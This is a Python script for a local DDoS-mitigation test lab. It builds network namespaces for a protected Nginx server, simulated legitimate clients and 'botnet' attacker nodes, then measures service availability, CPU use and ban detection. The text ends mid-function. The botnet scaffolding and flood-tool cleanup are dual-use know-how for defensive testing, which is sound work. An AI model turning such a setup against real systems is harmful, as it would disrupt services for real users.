#!/usr/bin/env python3
"""
Distributed DDoS Mitigation Testing Suite
==========================================
Creates a realistic multi-namespace network topology:
  - 1 server namespace (10.0.0.1) with Nginx + Gunicorn + control_plane.py
  - 40 legitimate client namespaces (10.0.1.1-10.0.1.40) with tc-simulated quality
  - 10 botnet attacker namespaces  (10.0.2.1-10.0.2.10)

Topology:
  All namespaces connect through a Linux bridge (ddos_br0) in the DEFAULT namespace.
  The server's veth_server interface is the XDP attachment point — all bridged
  traffic enters server_ns through this single interface, so the eBPF filter
  sees every packet from every client/attacker.

Usage:
    sudo python3 test_distributed_suite.py
"""

import subprocess
import time
import sys
import os
import threading
import signal
import random
import atexit

import psutil
import csv
import datetime

# ─────────────────────────────── CONFIGURATION ───────────────────────────────

SERVER_IP = "10.0.0.1"
SERVER_NS = "server_ns"
BRIDGE_NAME = "ddos_br0"      # Bridge lives in the DEFAULT namespace

LEGIT_COUNT = 20               # Number of legitimate client namespaces
LEGIT_IP_PREFIX = "10.0.1"     # Legit IPs: 10.0.1.1 – 10.0.1.40

BOTNET_COUNT = 5              # Number of botnet attacker namespaces
BOTNET_IP_PREFIX = "10.0.2"    # Botnet IPs: 10.0.2.1 – 10.0.2.10

SUBNET_MASK = "/16"            # All nodes in 10.0.0.0/16
HTTP_URL = f"http://{SERVER_IP}/"

PROJECT_DIR = "/home/artur/DDoS-mitigation/code"
NGINX_CONF = f"{PROJECT_DIR}/nginx.conf"
NGINX_UNPROTECTED_CONF = f"{PROJECT_DIR}/nginx_unprotected.conf"
CONTROL_PLANE = f"{PROJECT_DIR}/control_plane.py"
PYTHON_VENV = f"{PROJECT_DIR}/venv/bin/python"
LOG_FILE = "/tmp/mitigation_distributed_test.log"

# ─────────────────────────────── ANSI COLORS ─────────────────────────────────

GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

# ────────────────────────── GLOBAL STATE ─────────────────────────────────────

results = []
_all_created_ns = []           # Track for cleanup
_legit_traffic_stop = threading.Event()
_legit_threads = []
_daemon_proc = None
csv_lock = threading.Lock()

# ═══════════════════════════════════════════════════════════════════════════════
#  SERVICE-AVAILABILITY MEASUREMENT (continuous, via the background legit workers)
# ═══════════════════════════════════════════════════════════════════════════════
# The background _legit_worker threads already curl the server throughout the run.
# We record each request (HTTP status + latency), tagged with the current attack
# phase, to measure how well REAL users are served BEFORE / DURING / AFTER each
# attack. Reporting-only: this NEVER affects the PASS/FAIL logic in report().

AVAIL_BEFORE_SECONDS = 3           # per-scenario pre-attack baseline window (denser 'before')
AVAIL_AFTER_SECONDS = 10           # bounded post-attack recovery window (defines 'after';
                                   # replaces the old settle sleep so 'after' is comparable
                                   # across scenarios and excludes report()'s own curl overhead)
_avail_lock = threading.Lock()
_avail_samples = []                # samples for the CURRENT scenario (cleared per scenario)
_avail_scenario = None
_avail_period = "idle"             # before | during | after | idle   (idle = not recorded)
_avail_results = []                # aggregated per-scenario availability (for the final table)


def _avail_begin(scenario):
    """Open a new scenario's 'before' window (clears the previous scenario's samples)."""
    global _avail_scenario, _avail_period
    with _avail_lock:
        _avail_samples.clear()
    _avail_scenario = scenario
    _avail_period = "before"


def _avail_phase(period):
    """Switch the current availability phase: before | during | after | idle."""
    global _avail_period
    _avail_period = period


def _avail_record(scenario, period, profile, code, latency_s):
    """Record one legit-request outcome, unless idle / between scenarios."""
    if period == "idle" or scenario is None:
        return
    with _avail_lock:
        _avail_samples.append({"scenario": scenario, "period": period,
                               "profile": profile, "code": code,
                               "lat": latency_s, "ok": code == "200",
                               "ts": time.time()})   # per-request time (for the raw time-series)


def _pct(sorted_vals, q):
    """Nearest-rank percentile of an already-sorted list (empty -> 0.0)."""
    n = len(sorted_vals)
    if n == 0:
        return 0.0
    idx = max(0, min(n - 1, (q * n + 99) // 100 - 1))
    return sorted_vals[idx]


def _avail_kpis(samples):
    """Aggregate samples -> KPIs. Latency percentiles are over successful (200) requests
    only, so failures/timeouts don't masquerade as slow successes; they show up in the
    timeout rate instead. Latency is capped by curl --max-time (slower = timeout)."""
    total = len(samples)
    c200 = sum(1 for s in samples if s["code"] == "200")
    c503 = sum(1 for s in samples if s["code"] == "503")
    c000 = sum(1 for s in samples if s["code"] == "000")   # timeout / no response / conn refused
    cother = total - c200 - c503 - c000
    lats = sorted(s["lat"] * 1000.0 for s in samples if s["ok"])   # ms, successful only
    mean = sum(lats) / len(lats) if lats else 0.0
    return {
        "total": total, "ok": c200,
        "succ": (c200 / total * 100.0) if total else 0.0,
        "c200": c200, "c503": c503, "c000": c000, "cother": cother,
        "to_rate": (c000 / total * 100.0) if total else 0.0,
        "p50": _pct(lats, 50), "p95": _pct(lats, 95), "p99": _pct(lats, 99),
        "mean": mean, "max": (lats[-1] if lats else 0.0),
    }


def _avail_csv_paths():
    """Availability CSV paths, split by mode/backend like the resource CSV, so XDP vs
    iptables vs unprotected availability can be compared across separate runs."""
    mode = os.environ.get("MITIGATION_MODE", "active")
    backend = os.environ.get("MITIGATION_BACKEND", "xdp")
    tag = "unprotected" if mode == "none" else ("iptables" if backend == "iptables" else "performance")
    return f"/tmp/availability_{tag}.csv", f"/tmp/availability_raw_{tag}.csv", mode, backend


def _write_availability_csv(scenario, by_period, by_prof, profiles, snap):
    """Append one aggregated row per (period, profile) plus a raw per-request dump."""
    agg_csv, raw_csv, mode, backend = _avail_csv_paths()
    ts = datetime.datetime.now().isoformat()
    hdr = ["Timestamp", "Scenario", "Period", "Profile", "Mode", "Backend",
           "Total_Reqs", "Success_200", "Success_Rate_Pct", "HTTP_503",
           "HTTP_000_Timeout", "HTTP_Other", "Timeout_Rate_Pct",
           "Lat_p50_ms", "Lat_p95_ms", "Lat_p99_ms", "Lat_Mean_ms", "Lat_Max_ms"]

    def row(period, profile, k):
        return [ts, scenario, period, profile, mode, backend,
                k["total"], k["c200"], f"{k['succ']:.1f}", k["c503"],
                k["c000"], k["cother"], f"{k['to_rate']:.1f}",
                f"{k['p50']:.1f}", f"{k['p95']:.1f}", f"{k['p99']:.1f}",
                f"{k['mean']:.1f}", f"{k['max']:.1f}"]

    agg_new = not os.path.isfile(agg_csv)
    with open(agg_csv, "a", newline="") as f:
        w = csv.writer(f)
        if agg_new:
            w.writerow(hdr)
        for p in ("before", "during", "after"):
            w.writerow(row(p, "ALL", by_period[p]))          # headline (all profiles)
            for pr in profiles:                              # per-profile breakdown
                k = by_prof[(p, pr)]
                if k["total"]:
                    w.writerow(row(p, pr, k))

    raw_new = not os.path.isfile(raw_csv)
    with open(raw_csv, "a", newline="") as f:                # raw dump for time-series charts
        w = csv.writer(f)
        if raw_new:
            w.writerow(["Timestamp", "Scenario", "Period", "Profile", "HTTP_Code", "Latency_ms", "OK"])
        for s in snap:
            w.writerow([datetime.datetime.fromtimestamp(s["ts"]).isoformat(),
                        scenario, s["period"], s["profile"], s["code"],
                        f"{s['lat'] * 1000.0:.1f}", int(s["ok"])])


def _avail_finalize():
    """Snapshot the scenario's samples, aggregate, write CSVs, store the summary line, go idle.

    Called at the TOP of report() — BEFORE the collateral/HTTP verification — so the 'after'
    window is exactly the bounded post-kill recovery sleep (AVAIL_AFTER_SECONDS), not the
    variable report() duration. Reporting-only; uses the sample-tagged scenario name. The
    formatted console line is stored in _avail_results and printed later, in the report block."""
    global _avail_period
    with _avail_lock:
        snap = list(_avail_samples)
    _avail_period = "idle"                       # stop recording (report()'s own curls ignored)
    scenario = _avail_scenario or "unknown"
    periods = ("before", "during", "after")
    by_period = {p: _avail_kpis([s for s in snap if s["period"] == p]) for p in periods}
    profiles = sorted({s["profile"] for s in snap})
    by_prof = {(p, pr): _avail_kpis([s for s in snap
                                     if s["period"] == p and s["profile"] == pr])
               for p in periods for pr in profiles}

    b, d, a = by_period["before"], by_period["during"], by_period["after"]
    d_extra = f", p95 {d['p95']:.0f}ms" if d["total"] else ""

    def _f(k, extra=""):
        return f"{k['succ']:.0f}% (n={k['total']}{extra})" if k["total"] else "n/a"
    line = (f"  ├── Availability:      before {_f(b)} · "
            f"during {_f(d, d_extra)} · after {_f(a)}")

    _avail_results.append({"scenario": scenario, "by_period": by_period, "line": line})
    _write_availability_csv(scenario, by_period, by_prof, profiles, snap)


# ═══════════════════════════════════════════════════════════════════════════════
#  HELPER
# ═══════════════════════════════════════════════════════════════════════════════

def run(cmd, ns=None, bg=False, timeout=None):
    """Execute a shell command, optionally inside a network namespace."""
    full_cmd = []
    if ns:
        full_cmd.extend(["ip", "netns", "exec", ns])
    if isinstance(cmd, str):
        full_cmd.extend(cmd.split())
    else:
        full_cmd.extend(cmd)

    if bg:
        return subprocess.Popen(full_cmd, stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL)
    try:
        return subprocess.run(full_cmd, capture_output=True, text=True,
                              timeout=timeout)
    except (subprocess.TimeoutExpired, subprocess.CalledProcessError):
        return None

def _get_log_size():
    try:
        return os.path.getsize(LOG_FILE)
    except FileNotFoundError:
        return 0

# ═══════════════════════════════════════════════════════════════════════════════
#  INFRASTRUCTURE: Namespace & Network Topology Management
# ═══════════════════════════════════════════════════════════════════════════════

def cleanup_all():
    """Delete every namespace, bridge, and process created by this script."""
    global _daemon_proc

    print(f"\n{YELLOW}[*] Cleaning up all namespaces and processes...{RESET}")

    # Kill ALL mitigation-related processes system-wide
    subprocess.run(["pkill", "-9", "-f", "control_plane.py"], capture_output=True)
    subprocess.run(["pkill", "-9", "-f", "gunicorn"], capture_output=True)
    subprocess.run(["pkill", "-9", "-f", "nginx: master"], capture_output=True)
    subprocess.run(["pkill", "-9", "-f", "hping3"], capture_output=True)
    subprocess.run(["pkill", "-9", "-f", "_dist_"], capture_output=True)
    subprocess.run(["pkill", "-9", "-f", "wrk"], capture_output=True)
    if _daemon_proc and _daemon_proc.poll() is None:
        _daemon_proc.kill()
        _daemon_proc.wait()
    _daemon_proc = None
    time.sleep(0.5)
    # Nuclear: find and delete ALL namespaces matching our patterns
    result = subprocess.run(["ip", "netns", "list"], capture_output=True, text=True)
    if result and result.stdout:
        for line in result.stdout.strip().split("\n"):
            ns = line.split()[0] if line.strip() else ""
            if ns.startswith(("server_ns", "legit_", "bot_")):
                subprocess.run(["ip", "netns", "del", ns],
                               capture_output=True, timeout=10)
    _all_created_ns.clear()
    # Delete the bridge
    subprocess.run(["ip", "link", "del", BRIDGE_NAME],
                   capture_output=True, timeout=5)
    # Also delete orphaned veth interfaces
    result = subprocess.run(["ip", "link", "show"], capture_output=True, text=True)
    if result and result.stdout:
        for line in result.stdout.split("\n"):
            for prefix in ["vo_legit_", "vo_bot_", "veth_srv_br"]:
                if prefix in line:
                    iface = line.split(":")[1].strip().split("@")[0]
                    subprocess.run(["ip", "link", "del", iface],
                                   capture_output=True, timeout=5)

    try:
        # os.remove(LOG_FILE)
        pass
    except FileNotFoundError:
        pass

    print(f"{GREEN}[+] Cleanup complete.{RESET}")


atexit.register(cleanup_all)
signal.signal(signal.SIGINT, lambda s, f: sys.exit(1))
signal.signal(signal.SIGTERM, lambda s, f: sys.exit(1))


def create_host_bridge():
    """Create the central bridge in the DEFAULT (host) namespace.

    All client/attacker namespaces and the server namespace connect here.
    This mimics a LAN switch in a real data center.
    """
    subprocess.run(["ip", "link", "add", BRIDGE_NAME, "type", "bridge"],
                   capture_output=True)
    subprocess.run(["ip", "link", "set", BRIDGE_NAME, "up"],
                   capture_output=True)


def create_server_ns():
    """Create the server namespace and connect it to the host bridge.

    Topology:
        [server_ns]  veth_server  ←── veth pair ──→  veth_srv_br  →  ddos_br0
                     (10.0.0.1)                       (bridge port)

    control_plane.py attaches XDP to veth_server. Because all traffic from
    every client/attacker traverses the bridge and enters server_ns through
    this single veth, XDP sees EVERY ingress packet.
    """
    # Create namespace
    subprocess.run(["ip", "netns", "add", SERVER_NS], capture_output=True)
    _all_created_ns.append(SERVER_NS)

    # Create multi-queue veth pair: veth_server (→ server_ns) ↔ veth_srv_br (→ host bridge)
    subprocess.run([
        "ip", "link", "add", "veth_server", 
        "numrxqueues", "8", "numtxqueues", "8", 
        "type", "veth", "peer", "name", "veth_srv_br", 
        "numrxqueues", "8", "numtxqueues", "8"
    ], capture_output=True)

    # Move server end into server_ns
    subprocess.run(["ip", "link", "set", "veth_server", "netns", SERVER_NS],
                   capture_output=True)

    # Attach host end to the bridge
    subprocess.run(["ip", "link", "set", "veth_srv_br", "master", BRIDGE_NAME],
                   capture_output=True)
    subprocess.run(["ip", "link", "set", "veth_srv_br", "up"],
                   capture_output=True)

    # Configure server_ns
    run(f"ip addr add {SERVER_IP}{SUBNET_MASK} dev veth_server", ns=SERVER_NS)
    run("ip link set veth_server up", ns=SERVER_NS)
    run("ip link set lo up", ns=SERVER_NS)

    # Disable checksum offloading (required for XDP on veth)
    run("ethtool -K veth_server tx off rx off", ns=SERVER_NS)


def create_client_ns(ns_name, ip_addr):
    """Create a client/attacker namespace and connect it to the host bridge.

    Topology:
        [ns_name]  veth_in  ←── veth pair ──→  vo_<ns_name>  →  ddos_br0
                   (ip_addr)                    (bridge port)
    """
    veth_inner = "veth_in"
    # Truncate outer name to stay under the 15-char IFNAMSIZ limit
    veth_outer = f"vo_{ns_name[:12]}"

    subprocess.run(["ip", "netns", "add", ns_name], capture_output=True)
    _all_created_ns.append(ns_name)

    # Create multi-queue veth pair in host namespace
    subprocess.run([
        "ip", "link", "add", veth_outer, 
        "numrxqueues", "8", "numtxqueues", "8",
        "type", "veth", "peer", "name", veth_inner,
        "numrxqueues", "8", "numtxqueues", "8"
    ], capture_output=True)

    # Move inner end into client namespace
    subprocess.run(["ip", "link", "set", veth_inner, "netns", ns_name],
                   capture_output=True)

    # Attach outer end to host bridge
    subprocess.run(["ip", "link", "set", veth_outer, "master", BRIDGE_NAME],
                   capture_output=True)
    subprocess.run(["ip", "link", "set", veth_outer, "up"],
                   capture_output=True)

    # Configure client side
    run(f"ip addr add {ip_addr}{SUBNET_MASK} dev {veth_inner}", ns=ns_name)
    run(f"ip link set {veth_inner} up", ns=ns_name)
    run("ip link set lo up", ns=ns_name)


def apply_tc(ns_name, profile):
    """Apply tc netem to simulate varying network quality.

    Profiles:
      'perfect'    — no shaping (LAN speed)
      'broadband'  — 20ms ±2ms latency
      'mobile_3g'  — 150ms ±40ms latency, 2% loss
      'mobile_bad' — 300ms ±80ms latency, 5% loss, 1% corruption
    """
    dev = "veth_in"
    run(f"tc qdisc del dev {dev} root", ns=ns_name)

    if profile == "perfect":
        return
    elif profile == "broadband":
        run(["tc", "qdisc", "add", "dev", dev, "root", "netem",
             "delay", "20ms", "2ms", "distribution", "normal"], ns=ns_name)
    elif profile == "mobile_3g":
        run(["tc", "qdisc", "add", "dev", dev, "root", "netem",
             "delay", "150ms", "40ms", "distribution", "normal",
             "loss", "2%"], ns=ns_name)
    elif profile == "mobile_bad":
        run(["tc", "qdisc", "add", "dev", dev, "root", "netem",
             "delay", "300ms", "80ms", "distribution", "normal",
             "loss", "5%", "corrupt", "1%"], ns=ns_name)


def _wait_http_ready(timeout=15):
    """Probe the service (from server_ns) until it serves HTTP 200, so a freshly
    (re)started gunicorn/nginx is actually WARM before the scenario's pre-attack
    'before' baseline is measured. Without this, cold-worker transients right after
    each reset depress the baseline even for no-loss ('perfect') clients (observed).
    Runs before the daemon starts tailing, and probes the server's own IP (never a
    client IP), so it can't perturb the heuristics or the ban logic. Returns True
    once a 200 is seen."""
    start = time.time()
    while time.time() - start < timeout:
        res = run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                   "--max-time", "2", HTTP_URL], ns=SERVER_NS, timeout=4)
        if res is not None and res.stdout.strip() == "200":
            return True
        time.sleep(0.3)
    print(f"{YELLOW}[!] Service not HTTP-ready within {timeout}s (baseline may be noisy).{RESET}")
    return False


def start_server_services():
    """Start Nginx, Gunicorn, and the mitigation daemon inside server_ns."""
    global _daemon_proc

    # Prepare logs
    subprocess.run(["mkdir", "-p", "/var/log/nginx"], capture_output=True)
    for lf in ["/var/log/nginx/ddos_ml_access.log", "/var/log/nginx/error.log"]:
        open(lf, "w").close()

    # SSL certs (reuse if they exist)
    if not os.path.isfile("/etc/ssl/certs/nginx-selfsigned.crt"):
        subprocess.run([
            "openssl", "req", "-x509", "-nodes", "-days", "365",
            "-newkey", "rsa:2048",
            "-keyout", "/etc/ssl/private/nginx-selfsigned.key",
            "-out", "/etc/ssl/certs/nginx-selfsigned.crt",
            "-subj", "/C=PL/ST=Masovian/L=Warsaw/O=PoC/CN=twojadomena.pl"
        ], capture_output=True)

    # Create dummy backend app
    dummy_app = os.path.join(PROJECT_DIR, "dummy_app.py")
    with open(dummy_app, "w") as f:
        f.write(
            'def app(environ, start_response):\n'
            '    data = b"Backend is running flawlessly!\\n"\n'
            '    start_response("200 OK", [\n'
            '        ("Content-Type", "text/plain"),\n'
            '        ("Content-Length", str(len(data)))\n'
            '    ])\n'
            '    return iter([data])\n'
        )

    # Start Gunicorn
    run([PYTHON_VENV, "-m", "gunicorn", "--chdir", PROJECT_DIR,
         "--workers", "8", "--threads", "4", "-b", "0.0.0.0:8080",
         "dummy_app:app"], ns=SERVER_NS, bg=True)
    time.sleep(1)

    # Start Nginx
    mode = os.environ.get("MITIGATION_MODE", "active")
    active_conf = NGINX_UNPROTECTED_CONF if mode == "none" else NGINX_CONF
    run(["nginx", "-c", active_conf], ns=SERVER_NS, bg=True)
    time.sleep(0.5)
    _wait_http_ready()   # ensure gunicorn/nginx actually serve before proceeding (clean baseline)

    # Start mitigation daemon
    try:
        os.remove(LOG_FILE)
    except FileNotFoundError:
        pass

    if os.environ.get("MITIGATION_MODE") != "none":
        backend = os.environ.get("MITIGATION_BACKEND", "xdp")
        cmd = ["ip", "netns", "exec", SERVER_NS, "env", f"MITIGATION_BACKEND={backend}", PYTHON_VENV, "-u", CONTROL_PLANE]
        log_fd = open(LOG_FILE, "w")
        _daemon_proc = subprocess.Popen(cmd, stdout=log_fd, stderr=subprocess.STDOUT)

        # Wait for readiness
        print("[*] Waiting for mitigation daemon to initialize...", end="", flush=True)
        start = time.time()
        ready = False
        while time.time() - start < 60:
            try:
                with open(LOG_FILE, "r") as f:
                    if "Listening for Nginx logs" in f.read():
                        ready = True
                        break
            except FileNotFoundError:
                pass
            print(".", end="", flush=True)
            time.sleep(0.5)
        print()

        if not ready:
            print(f"{RED}[!] Daemon did not report ready within 60s!{RESET}")
        else:
            print(f"{GREEN}[+] Mitigation daemon is ready.{RESET}")
            time.sleep(2)
    else:
        print(f"{YELLOW}[!] MITIGATION_MODE=none: Server is running UNPROTECTED.{RESET}")
        time.sleep(1)


def reset_between_scenarios():
    """Restart daemon + Nginx + Gunicorn to clear ban state between scenarios.

    The control_plane.py keeps banned IPs in memory (BAN_TTL_SECONDS=300).
    Without a full restart, bots banned in Scenario N remain banned in N+1,
    preventing detection of new bans. This function performs a clean restart
    while preserving the network topology (namespaces, bridge, veths).
    """
    global _daemon_proc

    print(f"\n{CYAN}[*] Resetting mitigation environment...{RESET}")
    
    # Kill ALL control_plane.py processes inside server_ns
    run(["pkill", "-9", "-f", "control_plane.py"], ns=SERVER_NS)
    time.sleep(0.5)
    # Explicitly detach XDP from veth_server (in case the orphan left it attached)
    run(["ip", "link", "set", "dev", "veth_server", "xdp", "off"], ns=SERVER_NS)
    # Flush any leftover iptables rules if in comparative baseline mode
    run(["iptables", "-F"], ns=SERVER_NS)
    
    # Kill the running daemon
    if _daemon_proc and _daemon_proc.poll() is None:
        _daemon_proc.kill()
        _daemon_proc.wait()
        _daemon_proc = None

    # Kill Nginx and Gunicorn
    run("pkill -f 'nginx: master process'", ns=SERVER_NS)
    run(["pkill", "-f", "gunicorn"], ns=SERVER_NS)
    time.sleep(0.5)

    # Truncate all log files to clear stale [BAN] entries
    for lf in ["/var/log/nginx/ddos_ml_access.log", "/var/log/nginx/error.log"]:
        open(lf, "w").close()

    # Restart Gunicorn
    run([PYTHON_VENV, "-m", "gunicorn", "--chdir", PROJECT_DIR,
         "--workers", "8", "--threads", "4", "-b", "0.0.0.0:8080",
         "dummy_app:app"], ns=SERVER_NS, bg=True)
    time.sleep(1)

    # Restart Nginx
    mode = os.environ.get("MITIGATION_MODE", "active")
    active_conf = NGINX_UNPROTECTED_CONF if mode == "none" else NGINX_CONF
    run(["nginx", "-c", active_conf], ns=SERVER_NS, bg=True)
    time.sleep(0.5)
    _wait_http_ready()   # ensure gunicorn/nginx actually serve before proceeding (clean baseline)

    # Restart mitigation daemon with a fresh log file
    try:
        os.remove(LOG_FILE)
    except FileNotFoundError:
        pass

    if os.environ.get("MITIGATION_MODE") != "none":
        backend = os.environ.get("MITIGATION_BACKEND", "xdp")
        cmd = ["ip", "netns", "exec", SERVER_NS, "env", f"MITIGATION_BACKEND={backend}", PYTHON_VENV, "-u", CONTROL_PLANE]
        log_fd = open(LOG_FILE, "w")
        _daemon_proc = subprocess.Popen(cmd, stdout=log_fd, stderr=subprocess.STDOUT)

        # Wait for readiness
        start = time.time()
        while time.time() - start < 30:
            try:
                with open(LOG_FILE, "r") as f:
                    if "Listening for Nginx logs" in f.read():
                        break
            except FileNotFoundError:
                pass
            time.sleep(0.5)
        else:
            print(f"{RED}[!] Daemon did not restart within 30s!{RESET}")
            return

        time.sleep(1)
        print(f"{GREEN}[+] Environment reset complete.{RESET}")
    else:
        print(f"{YELLOW}[!] MITIGATION_MODE=none: Environment reset complete (Unprotected).{RESET}")
        time.sleep(1)


def build_topology():
    """Build the full test topology: bridge + server + legit + botnet."""
    legit_nodes = []     # [(ns_name, ip_addr, profile)]
    botnet_nodes = []    # [(ns_name, ip_addr)]

    # Clean any leftover state from a previous run
    cleanup_all()

    print(f"\n{BOLD}{CYAN}[*] Building network topology...{RESET}")

    create_host_bridge()
    create_server_ns()

    # ── Legitimate clients ──
    print(f"{CYAN}[*] Creating {LEGIT_COUNT} legitimate client namespaces...{RESET}")
    profiles = ["perfect", "broadband", "mobile_3g", "mobile_bad"]
    weights  = [0.30, 0.35, 0.25, 0.10]

    for i in range(1, LEGIT_COUNT + 1):
        ns  = f"legit_{i}"
        ip  = f"{LEGIT_IP_PREFIX}.{i}"
        create_client_ns(ns, ip)
        profile = random.choices(profiles, weights=weights, k=1)[0]
        apply_tc(ns, profile)
        legit_nodes.append((ns, ip, profile))

    print(f"{GREEN}[+] Legitimate clients ready. Profile distribution:{RESET}")
    for p in profiles:
        cnt = sum(1 for _, _, pr in legit_nodes if pr == p)
        print(f"    {p}: {cnt} nodes")

    # ── Botnet ──
    print(f"{CYAN}[*] Creating {BOTNET_COUNT} botnet attacker namespaces...{RESET}")
    for i in range(1, BOTNET_COUNT + 1):
        ns = f"bot_{i}"
        ip = f"{BOTNET_IP_PREFIX}.{i}"
        create_client_ns(ns, ip)
        botnet_nodes.append((ns, ip))

    print(f"{GREEN}[+] Botnet ready: {len(botnet_nodes)} nodes.{RESET}")

    # ── Server services ──
    start_server_services()

    return legit_nodes, botnet_nodes


# ═══════════════════════════════════════════════════════════════════════════════
#  LEGITIMATE BACKGROUND TRAFFIC
# ═══════════════════════════════════════════════════════════════════════════════

def _legit_worker(ns_name, ip_addr, profile):
    """Background thread: sends periodic HTTP requests from a legitimate ns."""
    base_interval = {"perfect": 1.5, "broadband": 2.0,
                     "mobile_3g": 3.0, "mobile_bad": 5.0}.get(profile, 2.0)

    while not _legit_traffic_stop.is_set():
        # Tag by the phase at request START, so a request issued under attack counts
        # as 'during' even if it completes just after. Recording is availability-only
        # and never changes this worker's behaviour/cadence.
        period = _avail_period
        scenario = _avail_scenario
        code, lat = "000", 10.0           # default = no response (curl --max-time)
        try:
            res = run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code} %{time_total}",
                       "--max-time", "10", HTTP_URL], ns=ns_name, timeout=15)
            if res is not None and res.stdout:
                parts = res.stdout.split()
                if parts:
                    code = parts[0]
                    if len(parts) > 1:
                        lat = float(parts[1])
        except Exception:
            pass
        _avail_record(scenario, period, profile, code, lat)
        jitter = random.uniform(-0.5, 1.0)
        _legit_traffic_stop.wait(max(0.5, base_interval + jitter))


def start_legit_traffic(legit_nodes):
    """Start background HTTP traffic from all legitimate client namespaces."""
    _legit_traffic_stop.clear()
    for ns, ip, profile in legit_nodes:
        t = threading.Thread(target=_legit_worker, args=(ns, ip, profile),
                             daemon=True)
        t.start()
        _legit_threads.append(t)
    print(f"[+] Started background traffic from {len(legit_nodes)} legitimate users.")


def stop_legit_traffic():
    """Signal all legitimate traffic threads to stop."""
    _legit_traffic_stop.set()
    for t in _legit_threads:
        t.join(timeout=3)
    _legit_threads.clear()


# ═══════════════════════════════════════════════════════════════════════════════
#  VERIFICATION HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def is_ip_banned(ns_name):
    """Check if an IP is blocked by XDP by pinging the server from its ns."""
    res = run(f"ping -c 2 -W 2 {SERVER_IP}", ns=ns_name, timeout=10)
    if res is None:
        return True
    return res.returncode != 0


def tail_logs_for_bans(target_ips, timeout=25, attack_start=None, log_start_pos=0):
    """Watch the daemon log for [BAN] entries matching any of the target IPs.

    Returns: dict {ip: (engine, ttm)}
    """
    start_time = attack_start or time.time()
    found = {}
    remaining = set(target_ips)

    while time.time() - start_time < timeout and remaining:
        try:
            with open(LOG_FILE, "r") as f:
                f.seek(log_start_pos)
                for line in f:
                    if "[BAN]" not in line:
                        continue
                    for ip in list(remaining):
                        if ip in line:
                            engine = _classify_engine(line)
                            found[ip] = (engine, time.time() - start_time)
                            remaining.discard(ip)
        except FileNotFoundError:
            pass
        if remaining:
            time.sleep(0.5)

    for ip in remaining:
        found[ip] = ("None", None)

    return found


def _classify_engine(line):
    """Classify the detection engine from a [BAN] log line."""
    if "SYN flood" in line:
        return "L4 SYN"
    if "Low-and-slow" in line:
        return "L4 Low-SYN"
    if "Volumetric" in line:
        return "L4 Volumetric"
    if "R.U.D.Y." in line:
        return "L7 R.U.D.Y."
    if "Slow connection" in line:
        return "L4 SlowConn"
    if "Heuristic" in line:
        return "L7 Heuristic"
    if "GRU" in line:
        return "GRU ML"
    return "Unknown"


def _read_softirqs_net_rx():
    """Read /proc/softirqs and return NET_RX counts per CPU as a list."""
    try:
        with open("/proc/softirqs", "r") as f:
            for line in f:
                if line.strip().startswith("NET_RX:"):
                    return [int(x) for x in line.split()[1:]]
    except Exception:
        pass
    return []


def _read_ip_inreceives():
    """Ip InReceives (cumulative) from /proc/net/snmp inside server_ns — packets
    that reached the kernel IP layer. XDP_DROP happens BEFORE this (never
    counted); iptables -j DROP in INPUT happens AFTER (counted), so this isolates
    where each backend drops, which raw PPS/softirq cannot on veth."""
    try:
        res = run(["cat", "/proc/net/snmp"], ns=SERVER_NS)
        if not res or not res.stdout:
            return 0
        hdr = vals = None
        for line in res.stdout.splitlines():
            if line.startswith("Ip:"):
                if hdr is None:
                    hdr = line.split()
                else:
                    vals = line.split()
                    break
        if hdr and vals and "InReceives" in hdr:
            return int(vals[hdr.index("InReceives")])
    except Exception:
        pass
    return 0


def _read_cpu_jiffies():
    """Read /proc/stat -> ((idle_all, total), [(idle_all, total) per cpu0..cpuN]).

    idle_all = idle + iowait; total = sum of all fields. Host-wide, same scope
    as /proc/softirqs, so the hot-core softirq index lines up with per_core.
    """
    agg, per_core = None, []
    try:
        with open("/proc/stat", "r") as f:
            for line in f:
                if not line.startswith("cpu"):
                    break
                parts = line.split()
                vals = [int(x) for x in parts[1:]]
                idle_all = vals[3] + (vals[4] if len(vals) > 4 else 0)
                total = sum(vals)
                if parts[0] == "cpu":
                    agg = (idle_all, total)
                else:                         # cpu0, cpu1, ...
                    per_core.append((idle_all, total))
    except Exception:
        pass
    return agg, per_core


def _cpu_busy_pct(before, after):
    """Busy% between two (idle_all, total) jiffie snapshots."""
    (idle_b, total_b), (idle_a, total_a) = before, after
    d_total, d_idle = total_a - total_b, idle_a - idle_b
    if d_total <= 0:
        return 0.0
    return max(0.0, min(100.0, (1.0 - d_idle / d_total) * 100.0))



def capture_metrics(scenario, phase):
    """Measure one ~1s window SYNCHRONOUSLY, then write the CSV row.

    Runs synchronously on purpose: the caller blocks for the full window, so
    each phase completes before the scenario advances. This keeps 'Phase 1:
    Baseline' (the first call in every scenario) a true pre-attack measurement
    instead of overlapping launch_botnet(), and stops adjacent phases' windows
    from bleeding into one another (also removes the concurrent-CSV-write race).
    """
    # Availability phase transitions, driven by the existing phase labels so each
    # scenario needs no extra edits (reporting-only; see the _avail_* helpers).
    if phase.startswith("Phase 1"):            # Baseline → open the pre-attack 'before' window
        _avail_begin(scenario)
        if AVAIL_BEFORE_SECONDS > 0:
            time.sleep(AVAIL_BEFORE_SECONDS)   # denser pre-attack baseline (recorded as 'before')
    elif phase.startswith("Phase 2:"):         # Pre-Mitigation → the attack is now live
        _avail_phase("during")                 # ('Phase 2A' sustained + 'Phase 3' stay 'during')

    def task():
        try:
            # 1. Locate target processes BEFORE the measurement window
            daemon_cpu = 0.0
            daemon_ram = 0.0
            nginx_cpu = 0.0
            daemon_procs = []
            nginx_procs = []
            for p in psutil.process_iter(['name', 'cmdline']):
                try:
                    cmdline = ' '.join(p.info['cmdline'] or [])
                    if "control_plane.py" in cmdline and "ip netns exec" not in cmdline:
                        p.cpu_percent(interval=None)  # prime the baseline
                        daemon_procs.append(p)
                    elif "nginx: worker process" in cmdline:
                        p.cpu_percent(interval=None)  # prime the baseline
                        nginx_procs.append(p)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

            def read_stats():
                try:
                    res_p = run(["cat", "/sys/class/net/veth_server/statistics/rx_packets"], ns=SERVER_NS)
                    res_b = run(["cat", "/sys/class/net/veth_server/statistics/rx_bytes"], ns=SERVER_NS)
                    rx_p = int(res_p.stdout.strip())
